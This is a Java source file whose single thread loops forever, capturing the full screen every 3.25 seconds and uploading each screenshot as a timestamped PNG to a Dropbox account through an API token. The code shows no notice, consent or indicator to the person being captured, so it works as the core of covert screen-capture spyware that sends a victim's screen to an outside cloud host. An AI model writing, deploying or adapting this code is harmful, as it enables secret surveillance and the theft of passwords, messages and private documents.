import com.dropbox.core.DbxException;
import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import com.dropbox.core.v2.files.UploadErrorException;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.text.SimpleDateFormat;
import java.util.Date;

public class MyThread extends Thread
{
    @Override
    public void run()
    {
        String ACCESS_TOKEN = "Your key for dropbox";

        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
        DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);

        for(;;)
        {
            BufferedImage image = null;
            try {
                image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));

                SimpleDateFormat format = new SimpleDateFormat("yyyyMMdd_HHmmss");
                String date = format.format(new Date());

                ByteArrayOutputStream os = new ByteArrayOutputStream();

                ImageIO.write(image, "png", os);

                byte[] bytes = os.toByteArray();
                InputStream is = new ByteArrayInputStream(bytes);

                client.files().uploadBuilder("/" + date + ".png")
                        .uploadAndFinish(is);

                sleep(3250);

            } catch (AWTException e) {e.printStackTrace();
            } catch (InterruptedException e) {e.printStackTrace();
            } catch (UploadErrorException e) {e.printStackTrace();
            } catch (DbxException e) {e.printStackTrace();
            } catch (IOException e) {e.printStackTrace();}

        }
    }
}
